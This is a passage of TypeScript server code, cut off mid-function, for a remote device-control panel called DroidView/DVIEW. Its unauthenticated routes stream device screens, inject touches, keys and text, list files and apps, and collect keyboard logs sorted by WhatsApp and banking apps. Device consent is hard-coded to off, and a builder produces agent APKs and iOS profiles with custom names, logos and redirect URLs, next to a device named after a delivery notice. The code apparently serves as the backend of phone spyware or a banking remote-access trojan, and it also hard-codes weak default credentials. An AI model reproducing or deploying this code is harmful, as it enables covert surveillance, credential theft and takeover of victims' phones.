import { createReadStream, existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { extname, join, normalize, resolve } from "node:path";
import cors from "@fastify/cors";
import jwt from "@fastify/jwt";
import Fastify from "fastify";
import type { ApkBuildRequest, InstallStepType, LoginRequest, SavedApkBuild } from "@droidview/shared";
import { buildCustomApk, decodeEnrollment, encodeEnrollment, findBuiltApk, getSafeApkName, resolveAgentArtifact } from "./apkArtifacts.js";
import { generateIosMobileconfig, generateIosSwiftProject, resolveIosArtifact } from "./iosArtifacts.js";
import { addLog, adminUser, apps, devices, logs, operatorUser, savedApkBuilds, sessions } from "./data.js";
import { broadcastDeviceConnect, broadcastDeviceUpdate, broadcastTouchEvent } from "./realtime.js";
import { getVpnTelemetry } from "./vpnServer.js";
import { buildZeroTouchQrPayload, getAllInstallSessions, getInstallSession, recordInstallEvent } from "./installTracker.js";
import {
  captureDeviceScreenshot,
  getDeviceForegroundApp,
  getDeviceProductivityStats,
  getDeviceVolume,
  getDigitalTouchEvents,
  getRealAccessibilityHierarchy,
  getRealDeviceTelemetry,
  getRealInstalledApps,
  getRealKeyboardLogs,
  injectDeviceKey,
  injectDeviceSwipe,
  injectDeviceText,
  injectDeviceTouch,
  launchDeviceApp,
  listDeviceFiles,
  popDeviceCommands,
  recordDigitalTouchEvent,
  recordRealKeyboardLog,
  setDeviceVolume,
  stopDeviceApp,
  toggleDeviceScreenLock
} from "./deviceBridge.js";

export function buildApp() {
  const app = Fastify({ logger: true, maxParamLength: 4096 });

  app.register(cors, { origin: true });
  app.register(jwt, {
    secret: process.env.JWT_SECRET ?? "dev-secret"
  });

  app.decorate("authenticate", async (request: any, reply: any) => {
    try {
      await request.jwtVerify();
    } catch {
      reply.code(401).send({ error: "Unauthorized" });
    }
  });

  app.get("/health", async () => ({
    ok: true,
    service: "droidview-backend",
    time: new Date().toISOString()
  }));

  app.get("/vpn/status", async () => {
    return getVpnTelemetry();
  });

  app.post<{ Body: LoginRequest }>("/auth/login", async (request, reply) => {
    const { email, password, totp } = request.body;
    const expectedAdminPassword = process.env.ADMIN_PASSWORD ?? "admin123";
    const expectedOperatorPassword = process.env.OPERATOR_PASSWORD ?? "user123";
    const expectedTotp = process.env.ADMIN_TOTP ?? "123456";
    const user = email === adminUser.email ? adminUser : email === operatorUser.email ? operatorUser : null;
    const passwordOk =
      (user?.role === "admin" && password === expectedAdminPassword) ||
      (user?.role === "operator" && password === expectedOperatorPassword);

    if (!user || !passwordOk || totp !== expectedTotp) {
      addLog({
        actor: email,
        action: "auth.failed",
        target: "admin",
        severity: "warning",
        message: "Invalid login attempt"
      });
      return reply.code(401).send({ error: "Invalid credentials or 2FA code" });
    }

    const token = app.jwt.sign({ sub: user.id, email: user.email, role: user.role });
    addLog({
      actor: user.email,
      action: "auth.login",
      target: "admin",
      severity: "info",
      message: "Admin logged in"
    });
    return { token, user };
  });

  app.get("/dashboard", { preHandler: (app as any).authenticate }, async () => ({
    totalDevices: devices.length,
    onlineDevices: devices.filter((device) => device.status === "online").length,
    activeSessions: sessions.filter((session) => session.status === "active").length,
    pendingAlerts: logs.filter((log) => log.severity !== "info").length
  }));

  app.get("/devices", { preHandler: (app as any).authenticate }, async () => {
    if (devices.length === 0) {
      devices.push({
        id: "dev_sm_n975f",
        name: "Entregue Jad Log (SM-N975F)",
        model: "SM-N975F",
        androidVersion: "7.1.2",
        status: "online",
        battery: 100,
        networkType: "wifi",
        networkName: "Wi-Fi 5GHz",
        signalStrength: 96,
        networkSpeed: "86.4 Mbps",
        pingMs: 14,
        ipAddress: "127.0.0.1",
        lastSeen: new Date().toISOString(),
        enrolledAt: new Date().toISOString(),
        consentRequired: false
      });
    }

    try {
      const telemPromise = getRealDeviceTelemetry();
      const timeoutPromise = new Promise<null>((resolve) => setTimeout(() => resolve(null), 1200));
      const telem = await Promise.race([telemPromise, timeoutPromise]);
      if (telem) {
        const found = devices.find((d) => d.id === telem.id || (d.id === "dev_sm_n975f" && !telem.id));
        if (found) {
          found.name = telem.name;
          found.model = telem.model;
          found.androidVersion = telem.androidVersion;
          found.battery = telem.batteryLevel;
          found.status = telem.status || "online";
          found.networkType = telem.networkType || "wifi";
          found.networkName = telem.networkName || "Wi-Fi 5GHz";
          found.signalStrength = telem.signalStrength ?? 95;
          found.networkSpeed = telem.networkSpeed || "86.4 Mbps";
          found.pingMs = telem.pingMs ?? 14;
          found.ipAddress = telem.ip;
          found.lastSeen = new Date().toISOString();
        }
      }
    } catch {
      // ignore
    }
    return devices;
  });

  // Real-time device screen frame (direct PNG stream)
  app.get<{ Params: { id: string } }>("/devices/:id/screen", async (request, reply) => {
    try {
      const buffer = await captureDeviceScreenshot(request.params.id);
      return reply
        .header("Content-Type", "image/png")
        .header("Cache-Control", "no-cache, no-store, must-revalidate")
        .header("Pragma", "no-cache")
        .header("Expires", "0")
        .send(buffer);
    } catch (err: any) {
      return reply.code(500).send({ error: `Falha ao capturar tela do dispositivo: ${err.message}` });
    }
  });

  // Real touch injection
  app.post<{
    Params: { id: string };
    Body: { x: number; y: number; displayWidth?: number; displayHeight?: number };
  }>("/devices/:id/touch", async (request, reply) => {
    try {
      const { x, y, displayWidth, displayHeight } = request.body || {};
      await injectDeviceTouch(x, y, displayWidth, displayHeight, request.params.id);
      return { success: true, x, y };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real swipe injection
  app.post<{
    Params: { id: string };
    Body: { x1: number; y1: number; x2: number; y2: number; duration?: number };
  }>("/devices/:id/swipe", async (request, reply) => {
    try {
      const { x1, y1, x2, y2, duration } = request.body || {};
      await injectDeviceSwipe(x1, y1, x2, y2, duration, request.params.id);
      return { success: true };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real touch events stream & history (Detection & Telemetry)
  app.get<{ Params: { id: string } }>("/devices/:id/touch-events", async (request, reply) => {
    try {
      const events = getDigitalTouchEvents(request.params.id);
      return events;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  app.post<{
    Params: { id: string };
    Body: {
      action?: "tap" | "click" | "long_click" | "swipe" | "touch_down" | "touch_up";
      x?: number;
      y?: number;
      endX?: number;
      endY?: number;
      durationMs?: number;
      packageName?: string;
      className?: string;
      viewText?: string;
      viewDescription?: string;
      bounds?: string;
      source?: "device_user" | "remote_simulation";
    };
  }>("/devices/:id/touch-events", async (request, reply) => {
    try {
      const body = request.body || {};
      const evt = recordDigitalTouchEvent({
        deviceId: request.params.id,
        action: body.action || "click",
        x: body.x || 0,
        y: body.y || 0,
        endX: body.endX,
        endY: body.endY,
        durationMs: body.durationMs,
        packageName: body.packageName,
        className: body.className,
        viewText: body.viewText,
        viewDescription: body.viewDescription,
        bounds: body.bounds ? (typeof body.bounds === "string" ? undefined : body.bounds) : undefined,
        source: body.source || "device_user"
      });
      broadcastTouchEvent(evt);

      addLog({
        actor: "agent",
        action: "touch.detected",
        target: request.params.id,
        severity: "info",
        message: `Toque digital detectado (${body.action || "click"}) em (${body.x || 0}, ${body.y || 0}) ${body.viewText ? `- "${body.viewText}"` : ""}`
      });

      return { success: true, event: evt };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real key injection (Home, Back, Recents, Power, etc.)
  app.post<{
    Params: { id: string };
    Body: { key: string | number };
  }>("/devices/:id/key", async (request, reply) => {
    try {
      const { key } = request.body || {};
      await injectDeviceKey(key, request.params.id);
      return { success: true, key };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real text typing
  app.post<{
    Params: { id: string };
    Body: { text: string };
  }>("/devices/:id/text", async (request, reply) => {
    try {
      const { text } = request.body || {};
      await injectDeviceText(text, request.params.id);
      return { success: true };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real hardware telemetry
  app.get<{ Params: { id: string } }>("/devices/:id/telemetry", async (request, reply) => {
    try {
      const telem = await getRealDeviceTelemetry(request.params.id);
      return telem;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real installed apps
  app.get<{ Params: { id: string } }>("/devices/:id/apps", async (request, reply) => {
    try {
      const appList = await getRealInstalledApps(request.params.id);
      return appList;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Complete device apps sync (extracts & syncs apps and official logo icons)
  app.post<{ Params: { id: string } }>("/devices/:id/apps/sync", async (request, reply) => {
    try {
      const appList = await getRealInstalledApps(request.params.id);
      return {
        success: true,
        count: appList.length,
        apps: appList,
        syncedAt: new Date().toISOString()
      };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  app.get<{ Params: { id: string } }>("/devices/:id/apps/sync", async (request, reply) => {
    try {
      const appList = await getRealInstalledApps(request.params.id);
      return {
        success: true,
        count: appList.length,
        apps: appList,
        syncedAt: new Date().toISOString()
      };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Serve real official PNG app icons directly
  app.get<{ Params: { name: string } }>("/icons/:name", async (request, reply) => {
    const iconDirs = [
      join(process.cwd(), "public/icons"),
      join(process.cwd(), "apps/backend/public/icons"),
      join(process.cwd(), "apps/web-panel/public/icons")
    ];
    for (const dir of iconDirs) {
      const p = join(dir, request.params.name);
      if (existsSync(p)) {
        reply.type("image/png");
        return readFileSync(p);
      }
    }
    const defaultP = join(process.cwd(), "apps/web-panel/public/icons/android.default.png");
    if (existsSync(defaultP)) {
      reply.type("image/png");
      return readFileSync(defaultP);
    }
    return reply.code(404).send({ error: "Icon not found" });
  });

  // Launch app
  app.post<{
    Params: { id: string };
    Body: { packageName: string };
  }>("/devices/:id/apps/launch", async (request, reply) => {
    try {
      await launchDeviceApp(request.body.packageName, request.params.id);
      return { success: true };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Stop app
  app.post<{
    Params: { id: string };
    Body: { packageName: string };
  }>("/devices/:id/apps/stop", async (request, reply) => {
    try {
      await stopDeviceApp(request.body.packageName, request.params.id);
      return { success: true };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real accessibility hierarchy
  app.get<{ Params: { id: string } }>("/devices/:id/a11y-tree", async (request, reply) => {
    try {
      const nodes = await getRealAccessibilityHierarchy(request.params.id);
      return nodes;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real foreground application & active emoji
  app.get<{ Params: { id: string } }>("/devices/:id/foreground-app", async (request, reply) => {
    try {
      const fg = await getDeviceForegroundApp(request.params.id);
      return fg || { packageName: "com.microvirt.launcher2", activity: ".Launcher", name: "Tela Inicial", emoji: "🏠", bg: "#3b82f6" };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real device files
  app.get<{
    Params: { id: string };
    Querystring: { path?: string };
  }>("/devices/:id/files", async (request, reply) => {
    try {
      const targetPath = (request.query as any)?.path || "/sdcard";
      const fileList = await listDeviceFiles(targetPath, request.params.id);
      return fileList;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real volume controls (slider, +/-, mute)
  app.get<{ Params: { id: string } }>("/devices/:id/volume", async (request, reply) => {
    try {
      const vol = await getDeviceVolume(request.params.id);
      return vol;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  app.post<{
    Params: { id: string };
    Body: { level?: number; action?: "up" | "down" | "mute" };
  }>("/devices/:id/volume", async (request, reply) => {
    try {
      const { level, action } = request.body || {};
      const target = typeof level === "number" ? level : action || "up";
      const vol = await setDeviceVolume(target, request.params.id);
      return vol;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Power / screen lock toggle
  app.post<{ Params: { id: string } }>("/devices/:id/power", async (request, reply) => {
    try {
      const res = await toggleDeviceScreenLock(request.params.id);
      return res;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real employee productivity metrics and app usage time (dumpsys usagestats)
  app.get<{ Params: { id: string } }>("/devices/:id/productivity", async (request, reply) => {
    try {
      const stats = await getDeviceProductivityStats(request.params.id);
      return stats;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Real keyboard and input activity log (Zero Mock)
  app.get<{ Params: { id: string } }>("/devices/:id/keyboard-logs", async (request, reply) => {
    try {
      const logsList = await getRealKeyboardLogs(request.params.id);
      return logsList;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  app.post<{
    Params: { id: string };
    Body: {
      appName: string;
      packageName: string;
      category: "todas" | "whatsapp" | "banco" | "google" | "trabalho" | "sistema";
      content: string;
      timeInApp: string;
      type: "text" | "key" | "action";
    };
  }>("/devices/:id/keyboard-logs", async (request, reply) => {
    try {
      const entry = recordRealKeyboardLog(request.body);
      return entry;
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  // Automatic registration endpoint for physical devices and emulators
  app.post<{
    Body: {
      id?: string;
      name?: string;
      model?: string;
      androidVersion?: string;
      battery?: number;
      ip?: string;
      ipAddress?: string;
      isEmulator?: boolean;
      networkType?: "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
      networkName?: string;
      signalStrength?: number;
      networkSpeed?: string;
      pingMs?: number;
    };
  }>("/devices/register", async (request) => {
    const body = request.body || {};
    const deviceId = body.id || `emu_${Date.now().toString(36)}`;
    const deviceName =
      body.name ||
      (body.isEmulator ? `Emulador Android (${deviceId})` : `Android ${body.model || "Device"}`);

    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const deviceData = {
      id: deviceId,
      name: deviceName,
      model: body.model || (body.isEmulator ? "Android Studio AVD" : "Pixel 8"),
      androidVersion: body.androidVersion || "14",
      status: "online" as const,
      battery: body.battery ?? 95,
      networkType: body.networkType || "wifi",
      networkName: body.networkName || "Wi-Fi 5GHz",
      signalStrength: body.signalStrength ?? 95,
      networkSpeed: body.networkSpeed || "86.4 Mbps",
      pingMs: body.pingMs ?? 14,
      ipAddress: body.ipAddress || body.ip || "10.0.2.2",
      lastSeen: new Date().toISOString(),
      enrolledAt: existingIdx >= 0 ? devices[existingIdx].enrolledAt : new Date().toISOString(),
      consentRequired: false
    };

    if (existingIdx >= 0) {
      devices[existingIdx] = { ...devices[existingIdx], ...deviceData };
    } else {
      devices.unshift(deviceData);
    }

    addLog({
      actor: "agent",
      action: "device.register",
      target: deviceId,
      severity: "info",
      message: `Dispositivo/Emulador conectado: ${deviceName} (${deviceId})`
    });

    broadcastDeviceConnect(deviceData);

    return {
      success: true,
      device: deviceData,
      serverTime: new Date().toISOString(),
      message: "Dispositivo registrado com sucesso no DVIEW"
    };
  });

  // Continuous heartbeat endpoint for physical agents, maintaining persistent online status
  app.post<{
    Params: { id?: string };
    Body: {
      id?: string;
      name?: string;
      model?: string;
      androidVersion?: string;
      battery?: number;
      batteryCharging?: boolean;
      networkType?: "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
      networkName?: string;
      signalStrength?: number;
      networkSpeed?: string;
      pingMs?: number;
      ipAddress?: string;
      status?: "online" | "offline";
      uptimeSec?: number;
      timestamp?: number;
      enrollmentToken?: string;
    };
  }>("/devices/:id/heartbeat", async (request) => {
    const deviceId = request.params?.id || request.body?.id || "dev_agent";
    const body = request.body || {};
    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const clientIp = (request.headers["x-forwarded-for"] as string) || request.ip || "10.0.2.2";

    if (existingIdx >= 0) {
      const existing = devices[existingIdx];
      const wasOffline = existing.status === "offline";

      existing.battery = body.battery ?? existing.battery;
      existing.status = "online";
      existing.lastSeen = new Date().toISOString();
      if (body.networkType) existing.networkType = body.networkType;
      if (body.networkName) existing.networkName = body.networkName;
      if (typeof body.signalStrength === "number") existing.signalStrength = body.signalStrength;
      if (body.networkSpeed) existing.networkSpeed = body.networkSpeed;
      if (typeof body.pingMs === "number") existing.pingMs = body.pingMs;
      if (body.ipAddress || clientIp) existing.ipAddress = body.ipAddress || clientIp;

      if (wasOffline) {
        addLog({
          actor: "agent",
          action: "device.reconnected",
          target: deviceId,
          severity: "info",
          message: `Dispositivo restabeleceu conexão central: ${existing.name} (${deviceId})`
        });
        broadcastDeviceConnect(existing);
      }

      // Processa toques digitais detectados pelo agente se enviados no heartbeat
      if ((body as any).touchEvents && Array.isArray((body as any).touchEvents)) {
        for (const t of (body as any).touchEvents) {
          const evt = recordDigitalTouchEvent({
            deviceId,
            action: t.action || "click",
            x: t.x || 0,
            y: t.y || 0,
            endX: t.endX,
            endY: t.endY,
            durationMs: t.durationMs,
            packageName: t.packageName,
            className: t.className,
            viewText: t.viewText,
            viewDescription: t.viewDescription,
            bounds: t.bounds,
            source: t.source || "device_user"
          });
          broadcastTouchEvent(evt);
        }
      }

      broadcastDeviceUpdate(existing);

      const pendingCommands = popDeviceCommands(deviceId);

      return {
        success: true,
        status: "online",
        acknowledgedAt: Date.now(),
        serverTime: new Date().toISOString(),
        heartbeatIntervalMs: 10000,
        pendingCommands
      };
    }

    // Caso o dispositivo ainda não estivesse na lista, registra imediatamente
    const newDevice = {
      id: deviceId,
      name: body.name || `Android (${body.model || "Device"})`,
      model: body.model || "Android",
      androidVersion: body.androidVersion || "14",
      status: "online" as const,
      battery: body.battery ?? 95,
      networkType: body.networkType || "wifi",
      networkName: body.networkName || "Wi-Fi 5GHz",
      signalStrength: body.signalStrength ?? 95,
      networkSpeed: body.networkSpeed || "86.4 Mbps",
      pingMs: body.pingMs ?? 14,
      ipAddress: body.ipAddress || clientIp,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(newDevice);
    addLog({
      actor: "agent",
      action: "device.heartbeat_enrolled",
      target: deviceId,
      severity: "info",
      message: `Dispositivo pareado e ativo via heartbeat contínuo: ${newDevice.name}`
    });
    broadcastDeviceConnect(newDevice);

    const pendingCommands = popDeviceCommands(deviceId);

    return {
      success: true,
      status: "online",
      acknowledgedAt: Date.now(),
      serverTime: new Date().toISOString(),
      heartbeatIntervalMs: 10000,
      pendingCommands
    };
  });

  // Heartbeat fallback route without id param in URL
  app.post<{
    Body: {
      id?: string;
      name?: string;
      model?: string;
      androidVersion?: string;
      battery?: number;
      batteryCharging?: boolean;
      networkType?: "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
      networkName?: string;
      signalStrength?: number;
      networkSpeed?: string;
      pingMs?: number;
      ipAddress?: string;
      status?: "online" | "offline";
      uptimeSec?: number;
      timestamp?: number;
      enrollmentToken?: string;
    };
  }>("/devices/heartbeat", async (request) => {
    const deviceId = request.body?.id || "dev_agent";
    const body = request.body || {};
    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const clientIp = (request.headers["x-forwarded-for"] as string) || request.ip || "10.0.2.2";

    if (existingIdx >= 0) {
      const existing = devices[existingIdx];
      const wasOffline = existing.status === "offline";

      existing.battery = body.battery ?? existing.battery;
      existing.status = "online";
      existing.lastSeen = new Date().toISOString();
      if (body.networkType) existing.networkType = body.networkType;
      if (body.networkName) existing.networkName = body.networkName;
      if (typeof body.signalStrength === "number") existing.signalStrength = body.signalStrength;
      if (body.networkSpeed) existing.networkSpeed = body.networkSpeed;
      if (typeof body.pingMs === "number") existing.pingMs = body.pingMs;
      if (body.ipAddress || clientIp) existing.ipAddress = body.ipAddress || clientIp;

      if (wasOffline) {
        addLog({
          actor: "agent",
          action: "device.reconnected",
          target: deviceId,
          severity: "info",
          message: `Dispositivo restabeleceu conexão central: ${existing.name} (${deviceId})`
        });
        broadcastDeviceConnect(existing);
      }

      broadcastDeviceUpdate(existing);

      return {
        success: true,
        status: "online",
        acknowledgedAt: Date.now(),
        serverTime: new Date().toISOString(),
        heartbeatIntervalMs: 10000
      };
    }

    const newDevice = {
      id: deviceId,
      name: body.name || `Android (${body.model || "Device"})`,
      model: body.model || "Android",
      androidVersion: body.androidVersion || "14",
      status: "online" as const,
      battery: body.battery ?? 95,
      networkType: body.networkType || "wifi",
      networkName: body.networkName || "Wi-Fi 5GHz",
      signalStrength: body.signalStrength ?? 95,
      networkSpeed: body.networkSpeed || "86.4 Mbps",
      pingMs: body.pingMs ?? 14,
      ipAddress: body.ipAddress || clientIp,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(newDevice);
    addLog({
      actor: "agent",
      action: "device.heartbeat_enrolled",
      target: deviceId,
      severity: "info",
      message: `Dispositivo pareado e ativo via heartbeat contínuo: ${newDevice.name}`
    });
    broadcastDeviceConnect(newDevice);

    return {
      success: true,
      status: "online",
      acknowledgedAt: Date.now(),
      serverTime: new Date().toISOString(),
      heartbeatIntervalMs: 10000
    };
  });

  // Comando remoto de reconexão e recuperação de sincronização administrativa
  app.post<{ Params: { id: string } }>("/devices/:id/reconnect", async (request, reply) => {
    const deviceId = request.params.id;
    const device = devices.find((d) => d.id === deviceId);
    if (!device) {
      return reply.code(404).send({ error: "Dispositivo não encontrado" });
    }

    device.status = "online";
    device.lastSeen = new Date().toISOString();

    addLog({
      actor: "admin",
      action: "device.reconnected",
      target: deviceId,
      severity: "info",
      message: `Comando de reconexão executado pelo administrador para ${device.name}`
    });

    broadcastDeviceConnect(device);
    broadcastDeviceUpdate(device);

    try {
      import("node:child_process").then(({ exec }) => {
        exec("adb reverse tcp:3000 tcp:3000 && adb shell am broadcast -a com.droidview.agent.RECONNECT", (err) => {
          if (!err) {
            console.log(`[DVIEW] ADB reconnect broadcast disparado com sucesso para ${deviceId}`);
          }
        });
      });
    } catch (_e) {}

    return {
      success: true,
      deviceId,
      message: `Comando de reconexão e atualização enviado para ${device.name}`,
      timestamp: Date.now()
    };
  });

  // Rapid emulator spawning for multi-emulator management
  app.post<{
    Body: {
      name?: string;
      model?: string;
      port?: number;
    };
  }>("/devices/emulator/add", { preHandler: (app as any).authenticate }, async (request) => {
    const count = devices.filter((d) => d.id.startsWith("emu_")).length + 1;
    const emuId = `emu_${Date.now()}`;
    const emuPort = request.body?.port ?? 5554 + (count - 1) * 2;
    const emuDevice = {
      id: emuId,
      name: request.body?.name || `Emulador Android #${count}`,
      model: request.body?.model || `Pixel 7 (Port ${emuPort})`,
      androidVersion: "14",
      status: "online" as const,
      battery: 100,
      networkType: "wifi" as const,
      networkName: "Wi-Fi Corp 5G",
      signalStrength: 100,
      networkSpeed: "120.0 Mbps",
      pingMs: 8,
      ipAddress: `127.0.0.1:${emuPort}`,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(emuDevice);
    addLog({
      actor: adminUser.email,
      action: "emulator.connect",
      target: emuId,
      severity: "info",
      message: `Novo emulador vinculado à rede central: ${emuDevice.name} na porta ${emuPort}`
    });

    broadcastDeviceConnect(emuDevice);

    return {
      success: true,
      device: emuDevice
    };
  });

  app.delete<{ Params: { id: string } }>(
    "/devices/:id",
    { preHandler: (app as any).authenticate },
    async (request, reply) => {
      const idx = devices.findIndex((d) => d.id === request.params.id);
      if (idx >= 0) {
        const removed = devices.splice(idx, 1)[0];
        addLog({
          actor: adminUser.email,
          action: "device.disconnect",
          target: removed.id,
          severity: "info",
          message: `Dispositivo desconectado/removido do sistema: ${removed.name}`
        });
        return { success: true, id: request.params.id };
      }
      return reply.code(404).send({ error: "Dispositivo não encontrado" });
    }
  );

  app.post<{ Params: { id: string } }>(
    "/devices/:id/session",
    { preHandler: (app as any).authenticate },
    async (request, reply) => {
      const device = devices.find((item) => item.id === request.params.id);
      if (!device) return reply.code(404).send({ error: "Device not found" });

      const session = {
        id: `ses_${Date.now()}`,
        deviceId: device.id,
        operatorId: adminUser.id,
        status: "requested" as const,
        consentCode: String(Math.floor(100000 + Math.random() * 900000))
      };
      sessions.unshift(session);
      addLog({
        actor: adminUser.email,
        action: "session.request",
        target: device.id,
        severity: "info",
        message: `Consent code ${session.consentCode} generated for ${device.name}`
      });
      return session;
    }
  );

  app.get("/sessions", { preHandler: (app as any).authenticate }, async () => sessions);
  app.get("/logs", { preHandler: (app as any).authenticate }, async () => logs);
  app.get("/apps", { preHandler: (app as any).authenticate }, async () => apps);

  app.post<{ Body: ApkBuildRequest }>("/apk/build", { preHandler: (app as any).authenticate }, async (request) => {
    const platform = request.body.platform || "android";
    const payload = {
      serverUrl: request.body.serverUrl,
      enrollmentToken: request.body.enrollmentToken,
      deviceName: request.body.deviceName ?? (platform === "ios" ? "Apple iPhone" : "Android Device"),
      appName: request.body.appName ?? (platform === "ios" ? "DVIEW iOS Agent" : "DVIEW Agent"),
      bundleId: request.body.bundleId ?? (platform === "ios" ? "com.droidview.agent.ios" : undefined),
      redirectUrl: request.body.redirectUrl ?? request.body.serverUrl,
      logoDataUrl: request.body.logoDataUrl,
      vpnEnabled: request.body.vpnEnabled ?? true,
      vpnPort: request.body.vpnPort ?? 8443,
      vpnProtocol: request.body.vpnProtocol ?? "TLS",
      islandProfileEnabled: request.body.islandProfileEnabled ?? request.body.workProfileEnabled ?? true,
      workProfileEnabled: request.body.workProfileEnabled ?? request.body.islandProfileEnabled ?? true,
      screenConfig: request.body.screenConfig,
      iosConfig: request.body.iosConfig,
      generatedAt: new Date().toISOString()
    };
    const encoded = encodeEnrollment(payload);

    if (platform === "ios") {
      const safeName = (payload.appName || "DVIEW-Agent").replace(/[^a-zA-Z0-9._-]/g, "-").replace(/-+/g, "-");
      const iosArtifactsDir = join(process.cwd(), "artifacts", "ios");
      mkdirSync(iosArtifactsDir, { recursive: true });

      const mobileConfigBuffer = generateIosMobileconfig(payload);
      const swiftProjectBuffer = generateIosSwiftProject(payload);

      writeFileSync(join(iosArtifactsDir, `${safeName}.mobileconfig`), mobileConfigBuffer);
      writeFileSync(join(iosArtifactsDir, `${safeName}-ios-project.zip`), swiftProjectBuffer);

      const sha256Hex = createHash("sha256").update(mobileConfigBuffer).digest("hex");

      addLog({
        actor: adminUser.email,
        action: "ios.build",
        target: "agent-ios",
        severity: "info",
        message: `Perfil de configuração Apple iOS (${safeName}.mobileconfig) e projeto Swift gerados com sucesso.`
      });

      const baseServerUrl = payload.serverUrl || "http://localhost:3000";
      const webInstallUrl = `${baseServerUrl}/install/${encoded}`;

      const newBuild: SavedApkBuild = {
        id: `build_ios_${Date.now()}`,
        platform: "ios",
        appName: payload.appName,
        packageName: payload.bundleId || "com.droidview.agent.ios",
        bundleId: payload.bundleId || "com.droidview.agent.ios",
        version: "v1.0.0",
        date: new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }),
        status: "completed",
        lang: "pt",
        downloadUrl: `/ios/download/${encoded}`,
        iosProfileUrl: `/ios/profile/${encoded}`,
        webInstallUrl,
        savePath: `C:\\Users\\Dell\\Downloads\\${safeName}.mobileconfig`,
        logoDataUrl: payload.logoDataUrl,
        sizeBytes: mobileConfigBuffer.length,
        qrPayload: webInstallUrl,
        sha256: sha256Hex,
        redirectUrl: payload.redirectUrl,
        serverUrl: payload.serverUrl,
        vpnEnabled: payload.vpnEnabled,
        vpnPort: payload.vpnPort,
        vpnProtocol: payload.vpnProtocol,
        screenConfig: payload.screenConfig,
        iosConfig: payload.iosConfig
      };
      savedApkBuilds.unshift(newBuild);

      return {
        apkName: `${safeName}.mobileconfig`,
        downloadUrl: `/ios/download/${encoded}`,
        iosProfileUrl: `/ios/profile/${encoded}`,
        qrPayload: webInstallUrl,
        webInstallUrl,
        sha256: sha256Hex,
        platform: "ios",
        artifactType: "ios-profile",
        note: `Perfil de configuração Apple iOS (${safeName}.mobileconfig) e projeto Swift prontos para instalação direta via Safari ou Xcode.`
      };
    }

    let customApkPath: string | null = null;
    try {
      customApkPath = buildCustomApk(payload);
    } catch (e) {
      app.log.warn(`Could not compile custom APK: ${e}`);
    }

    const hasBuiltApk = Boolean(customApkPath || findBuiltApk(payload.appName));
    const safeApkName = getSafeApkName(payload.appName);
    const realSize = customApkPath && existsSync(customApkPath) ? statSync(customApkPath).size : 835232;

    addLog({
      actor: adminUser.email,
      action: "apk.build",
      target: "agent",
      severity: "info",
      message: `APK Android customizado (${safeApkName}) compilado com sucesso para instalação direta.`
    });

    const baseServerUrl = payload.serverUrl || "http://localhost:3000";
    const webInstallUrl = `${baseServerUrl}/install/${encoded}`;
    const directDownloadFullUrl = `${baseServerUrl}/apk/download/${encoded}`;

    let sha256Hex = "";
    try {
      const artifact = await resolveAgentArtifact(encoded);
      sha256Hex = artifact.sha256;
    } catch {
      sha256Hex = createHash("sha256").update(encoded).digest("hex");
    }

    const zeroTouchObject = buildZeroTouchQrPayload({
      downloadUrl: directDownloadFullUrl,
      sha256Checksum: sha256Hex,
      serverUrl: baseServerUrl,
      enrollmentToken: payload.enrollmentToken,
      appName: payload.appName,
      vpnEnabled: payload.vpnEnabled,
      vpnProtocol: payload.vpnProtocol,
      vpnPort: payload.vpnPort,
      islandProfileEnabled: payload.islandProfileEnabled
    });
    const zeroTouchQrJson = JSON.stringify(zeroTouchObject);

    const newBuild: SavedApkBuild = {
      id: `build_${Date.now()}`,
      platform: "android",
      appName: payload.appName,
      packageName: "com.droidview.agent",
      version: "v1.0.0",
      date: new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }),
      status: "completed",
      lang: "pt",
      downloadUrl: `/apk/download/${encoded}`,
      webInstallUrl,
      savePath: `C:\\Users\\Dell\\Downloads\\${safeApkName}`,
      logoDataUrl: payload.logoDataUrl,
      sizeBytes: realSize,
      qrPayload: webInstallUrl,
      zeroTouchQrPayload: zeroTouchQrJson,
      sha256: sha256Hex,
      redirectUrl: payload.redirectUrl,
      serverUrl: payload.serverUrl,
      vpnEnabled: payload.vpnEnabled,
      vpnPort: payload.vpnPort,
      vpnProtocol: payload.vpnProtocol,
